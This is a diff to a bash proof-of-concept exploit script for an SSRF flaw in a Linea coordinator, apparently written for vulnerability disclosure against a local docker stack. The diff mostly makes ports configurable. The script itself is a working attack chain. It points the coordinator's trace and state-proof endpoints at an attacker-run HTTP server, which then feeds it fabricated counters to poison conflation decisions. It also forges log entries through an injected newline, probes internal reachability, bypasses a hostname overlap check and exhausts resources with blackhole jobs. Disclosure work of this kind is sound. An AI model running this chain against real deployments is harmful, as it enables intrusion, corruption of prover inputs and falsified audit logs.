@@ -29,6 +29,12 @@
 #   [3] AFTER   (defender snapshot + before/after impact table)
 #   [4] VERDICT (final impact summary, computed from evidence)
 #
+# CONFIGURABLE ENVIRONMENT VARIABLES (all with sane defaults):
+#   OOB_PORT    - attacker OOB/MITM server port           (default: 12345)
+#   BH_PORT     - blackhole oracle port, must be closed    (default: 9999)
+#   A3_HOSTNAME - live-endpoint string for overlap-check test
+#                 (default: http://l2-node-besu:8545/ - from public repo)
+#
 # Prerequisites: docker environment with linea stack running, coordinator
 # healthy, L2 blocks being produced (chain head > 5), python3 available.
 # Duration: approximately 8 minutes.
@@ -37,13 +43,14 @@
 #   docker restart coordinator && sleep 60
 #   rm -rf tmp/local/conflation-backtesting/*
 #   ./poc.sh
+#   (or with custom ports: OOB_PORT=23456 BH_PORT=9998 ./poc.sh)
 # ==============================================================================
 set -u
 
-# Configurable via env, with defaults (fixes last hardcoded items)
-OOB_PORT="${OOB_PORT:-12345}"          # attacker server port
-BH_PORT="${BH_PORT:-9999}"             # blackhole port (verify closed first)
-A3_HOSTNAME="${A3_HOSTNAME:-http://l2-node-besu:8545/}"  # live-endpoint string from public repo
+# --- configurable parameters (all used; override via env) ---
+OOB_PORT="${OOB_PORT:-12345}"
+BH_PORT="${BH_PORT:-9999}"
+A3_HOSTNAME="${A3_HOSTNAME:-http://l2-node-besu:8545/}"
 
 # --- output ---
 OUT="poc_results.txt"
@@ -57,6 +64,7 @@ echo "######################################################################"
 echo "#  LINEA COORDINATOR SSRF - END-TO-END IMPACT PoC"
 echo "#  started: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
 echo "#  run marker: $SPOOF_MARK"
+echo "#  config: OOB_PORT=$OOB_PORT BH_PORT=$BH_PORT"
 echo "######################################################################"
 
 # =============================================================================
@@ -65,11 +73,22 @@ echo "######################################################################"
 echo ""
 echo "=== [0] HARNESS SETUP ==============================================="
 
-# FIX: kill orphan listeners BEFORE spawning new ones
-for p in 12345; do
-  fuser -k ${p}/tcp 2>/dev/null
-done
+# kill orphan listeners BEFORE spawning new ones (uses configured port)
+fuser -k ${OOB_PORT}/tcp 2>/dev/null
 sleep 1
+
+# --- verify BH_PORT is actually closed (auto-increment if not) ---
+BH_RETRIES=0
+while [ $BH_RETRIES -lt 5 ]; do
+  if curl -s --connect-timeout 2 "http://127.0.0.1:$BH_PORT/" >/dev/null 2>&1 \
+     || fuser $BH_PORT/tcp >/dev/null 2>&1; then
+    echo "[!] BH_PORT $BH_PORT appears OPEN on host - incrementing"
+    BH_PORT=$((BH_PORT+1)); BH_RETRIES=$((BH_RETRIES+1))
+  else
+    break
+  fi
+done
+echo "[+] blackhole oracle port: $BH_PORT (closed)"
 
 # --- find coordinator container ---
 C=$(docker ps --format '{{.Names}}' | grep -iE coordinator | head -n1)
@@ -80,12 +99,15 @@ if [ -z "$C" ]; then
 fi
 echo "[+] Coordinator container: $C"
 
-# --- health check ---
+# --- health check (fixed: reject 'unhealthy' explicitly) ---
 STATUS=$(docker ps --filter name="$C" --format '{{.Status}}' | head -n1)
 echo "[+] Container status: $STATUS"
-if ! echo "$STATUS" | grep -q "healthy"; then
-  echo "[-] Coordinator not healthy - run: docker restart $C; sleep 60; re-run"
+if echo "$STATUS" | grep -q "unhealthy"; then
+  echo "[-] Coordinator unhealthy - run: docker restart $C; sleep 60; re-run"
   exit 1
+fi
+if ! echo "$STATUS" | grep -q "healthy"; then
+  echo "[*] No docker healthcheck reported (status: $STATUS) - continuing with RPC probe"
 fi
 
 # --- find RPC port and IP ---
@@ -180,17 +202,18 @@ submit_raw() { # $1=traces endpoint, $2=shomei endpoint, $3=id
     \"shomeiApi\":{\"endpoint\":\"$2\",\"requestLimitPerEndpoint\":100}}]}"
 }
 
-# --- attacker-controlled server ---
+# --- attacker-controlled server (port via env) ---
 OOB_LOG=/tmp/poc_oob.log
 OOB_CTR=/tmp/poc_oob_counter
 SRV_LOG=/tmp/poc_server_stderr.log
 rm -f "$OOB_LOG" "$OOB_CTR" "$SRV_LOG"
 : > "$OOB_LOG"; echo 0 > "$OOB_CTR"
-export OOB_LOG OOB_CTR TRACES_UP
+export OOB_LOG OOB_CTR TRACES_UP OOB_PORT
 
 python3 - <<'PYEOF' > "$SRV_LOG" 2>&1 &
 import http.server, json, os, urllib.request
 LOG=os.environ["OOB_LOG"]; CTRF=os.environ["OOB_CTR"]; UP=os.environ["TRACES_UP"]
+PORT=int(os.environ.get("OOB_PORT","12345"))
 
 KEYS=["ADD","BLAKE_MODEXP_DATA","BLOCK_DATA","BLOCK_HASH","BLS_DATA","EC_DATA","EUC","EXP","EXT","GAS",
 "HUB","LOG_DATA","LOG_INFO","MMIO","MMU","MOD","MUL","MXP","OOB","RLP_ADDR","RLP_AUTH","RLP_TXN",
@@ -299,7 +322,7 @@ class H(http.server.BaseHTTPRequestHandler):
 
     def log_message(self,*a): pass
 
-http.server.ThreadingHTTPServer(("0.0.0.0",12345),H).serve_forever()
+http.server.ThreadingHTTPServer(("0.0.0.0",PORT),H).serve_forever()
 PYEOF
 
 SRV_PID=$!
@@ -310,7 +333,8 @@ if ! kill -0 $SRV_PID 2>/dev/null; then
   exit 1
 fi
 oob_total() { cat "$OOB_CTR" 2>/dev/null || echo 0; }
-echo "[+] Attacker server up (pid $SRV_PID) at http://$GW:12345"
+ATTACKER="http://$GW:$OOB_PORT"          # single source of truth for attacker URL
+echo "[+] Attacker server up (pid $SRV_PID) at $ATTACKER"
 echo ""
 
 # =============================================================================
@@ -338,7 +362,7 @@ echo "=== [2] ATTACK (attacker view - RPC only) ==========================="
 
 # ---- A1: Blind SSRF confirmation + protocol capture ----
 echo "--- [A1] Blind SSRF + protocol capture ------------------------------"
-submit_v "http://$GW:12345/recon" "http://$GW:12345/recon" "A1" || exit 1
+submit_v "$ATTACKER/recon" "$ATTACKER/recon" "A1" || exit 1
 J1=$(jobid "$R")
 echo "  waiting 40s..."
 sleep 40
@@ -352,7 +376,7 @@ grep '^CALL' "$OOB_LOG" | tail -5 | sed 's/^/    /'
 # ---- A2: Internal reachability oracle ----
 echo ""
 echo "--- [A2] Reachability oracle (blackhole vs reachable) ---------------"
-submit_v "http://$GW:9999" "http://$GW:12345" "A2" || true
+submit_v "http://$GW:$BH_PORT" "$ATTACKER" "A2" || true
 J2=$(jobid "$R")
 A2_BH_CREATED=1
 [ -z "$J2" ] && A2_BH_CREATED=0
@@ -367,10 +391,10 @@ echo "     reachable target (A1) = OOB calls within seconds"
 # ---- A3: Overlap check bypass (hostname vs IP) ----
 echo ""
 echo "--- [A3] Overlap check: hostname rejected vs IP accepted ------------"
-R_HOST=$(submit_raw "http://l2-node-besu:8545/" "http://$GW:12345" 3)
-echo "  hostname form (http://l2-node-besu:8545/):"
+R_HOST=$(submit_raw "$A3_HOSTNAME" "$ATTACKER" 3)
+echo "  hostname form ($A3_HOSTNAME):"
 echo "    -> $(echo "$R_HOST" | head -c 150)"
-R_IP=$(submit_raw "$TRACES_UP" "http://$GW:12345" 4)
+R_IP=$(submit_raw "$TRACES_UP" "$ATTACKER" 4)
 echo "  IP form ($TRACES_UP):"
 echo "    -> $(echo "$R_IP" | head -c 150)"
 A3_HOST_REJECTED=0; A3_IP_ACCEPTED=0
@@ -387,7 +411,7 @@ fi
 # ---- A4: Data poisoning (silent corruption, +1000) ----
 echo ""
 echo "--- [A4] Data poisoning: silent corruption (counters +1000) ---------"
-submit_v "http://$GW:12345/tap" "http://$GW:12345/tap" "A4" || true
+submit_v "$ATTACKER/tap" "$ATTACKER/tap" "A4" || true
 J4=$(jobid "$R")
 A4_FOUND=0
 for i in $(seq 1 12); do
@@ -406,7 +430,7 @@ done
 # ---- A5: Data poisoning (decision control, 999999999) ----
 echo ""
 echo "--- [A5] Data poisoning: decision control (counters = 999999999) ----"
-submit_v "http://$GW:12345/tapover" "http://$GW:12345/tapover" "A5" || true
+submit_v "$ATTACKER/tapover" "$ATTACKER/tapover" "A5" || true
 J5=$(jobid "$R")
 A5_FOUND=0
 for i in $(seq 1 12); do
@@ -426,7 +450,7 @@ done
 echo ""
 echo "--- [A6] Black-box full pipeline ride (all upstreams fabricated) ----"
 : > "$OOB_LOG"
-submit_v "http://$GW:12345/fab" "http://$GW:12345/fab" "A6" || true
+submit_v "$ATTACKER/fab" "$ATTACKER/fab" "A6" || true
 J6=$(jobid "$R")
 echo "  waiting 90s for pipeline ride..."
 sleep 90
@@ -444,11 +468,11 @@ fi
 # ---- A7: Log forging (CWE-117) with run-scoped marker ----
 echo ""
 echo "--- [A7] Log forging (CWE-117) - marker: $SPOOF_MARK --------------"
-FORGED="http://$GW:12345/x\\ntime=2099-01-01T00:00:00,000Z level=ERROR message=$SPOOF_MARK FAKE-LOG-ENTRY-BY-ATTACKER"
+FORGED="$ATTACKER/x\\ntime=2099-01-01T00:00:00,000Z level=ERROR message=$SPOOF_MARK FAKE-LOG-ENTRY-BY-ATTACKER"
 R=$(rpc "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":8,
   \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
   \"tracesApi\":{\"endpoint\":\"$FORGED\",\"requestLimitPerEndpoint\":1},
-  \"shomeiApi\":{\"endpoint\":\"http://$GW:12345\",\"requestLimitPerEndpoint\":1}}]}")
+  \"shomeiApi\":{\"endpoint\":\"$ATTACKER\",\"requestLimitPerEndpoint\":1}}]}")
 echo "  submit response: $(echo "$R" | head -c 120)"
 sleep 15
 A7_HIT=$(docker logs "$C" 2>&1 | grep -c "time=2099-01-01.*$SPOOF_MARK" || true)
@@ -463,7 +487,7 @@ echo ""
 echo "--- [A8] Resource exhaustion (verified blackhole jobs) --------------"
 A8_OK=0
 for i in 1 2 3 4 5; do
-  submit_v "http://$GW:9999" "http://$GW:9999" "A8.$i" && A8_OK=$((A8_OK+1)) || true
+  submit_v "http://$GW:$BH_PORT" "http://$GW:$BH_PORT" "A8.$i" && A8_OK=$((A8_OK+1)) || true
   sleep 2
 done
 echo "  blackhole jobs accepted: $A8_OK/5"
@@ -509,7 +533,6 @@ echo ""
 
 V_PASS=0; V_TOTAL=0
 
-# V1: SSRF
 V_TOTAL=$((V_TOTAL+1))
 if [ "${A1_RECON:-0}" -ge 1 ] || [ "${A6_SHOMEI:-0}" -ge 1 ]; then
   echo "[PASS] SSRF: coordinator made server-side POSTs to attacker URL"
@@ -519,7 +542,6 @@ else
   echo "[FAIL] SSRF not confirmed"
 fi
 
-# V2: Data poisoning
 V_TOTAL=$((V_TOTAL+1))
 if [ "${A_BATCH:-0}" -ge 1 ]; then
   echo "[PASS] DATA POISONING: attacker counters ingested -> conflation decisions"
@@ -529,7 +551,6 @@ else
   echo "[FAIL] poisoning not observed - check A4/A5 stage output"
 fi
 
-# V3: Prover input control
 V_TOTAL=$((V_TOTAL+1))
 if [ "${A6_SHOMEI:-0}" -ge 1 ]; then
   echo "[PASS] PROVER-INPUT CONTROL: coordinator requested state Merkle proof"
@@ -539,7 +560,6 @@ else
   echo "[WARN] pipeline ride did not reach shomei stage"
 fi
 
-# V4: Log forging
 V_TOTAL=$((V_TOTAL+1))
 if [ "${A7_HIT:-0}" -ge 1 ]; then
   echo "[PASS] LOG FORGING (CWE-117): $A7_HIT forged entries with marker $SPOOF_MARK"
@@ -548,7 +568,6 @@ else
   echo "[FAIL] log forging not observed"
 fi
 
-# V5: Persistent SSRF / DoS
 V_TOTAL=$((V_TOTAL+1))
 if [ "${A_RETRY:-0}" -gt "$B_RETRY" ]; then
   echo "[PASS] PERSISTENT SSRF/DoS: retry lines $B_RETRY -> $A_RETRY"
@@ -558,7 +577,6 @@ else
   echo "[WARN] retry growth: $B_RETRY -> $A_RETRY"
 fi
 
-# V6: Info disclosure
 V_TOTAL=$((V_TOTAL+1))
 if [ "${A_DUMP:-0}" -gt "$B_DUMP" ]; then
   echo "[PASS] INFO DISCLOSURE: config dumps $B_DUMP -> $A_DUMP lines"
@@ -568,7 +586,6 @@ else
   echo "[WARN] config dump delta: $B_DUMP -> $A_DUMP"
 fi
 
-# Bonus: A3 overlap check
 if [ "$A3_HOST_REJECTED" = 1 ] && [ "$A3_IP_ACCEPTED" = 1 ]; then
   echo ""
   echo "[PASS] OVERLAP CHECK BYPASS: hostname rejected but IP of same service accepted"
@@ -592,14 +609,14 @@ echo ""
 # CLEANUP
 # =============================================================================
 echo "=== ARTIFACTS ========================================================="
-echo "  $OUT           (this output)"
-echo "  $OOB_LOG       (OOB/attacker server log)"
-echo "  /tmp/poc_a1_evidence.log  (A1 preserved capture)"
-echo "  $SRV_LOG       (attacker server stderr)"
+echo "  $OUT                       (this output)"
+echo "  $OOB_LOG                   (OOB/attacker server log)"
+echo "  /tmp/poc_a1_evidence.log   (A1 preserved capture)"
+echo "  $SRV_LOG                   (attacker server stderr)"
 echo ""
 
 kill $SRV_PID 2>/dev/null
-fuser -k 12345/tcp 2>/dev/null
+fuser -k ${OOB_PORT}/tcp 2>/dev/null
 
 echo "=== CLEANUP (run after preserving evidence) ==========================="
 echo "  docker restart $C"
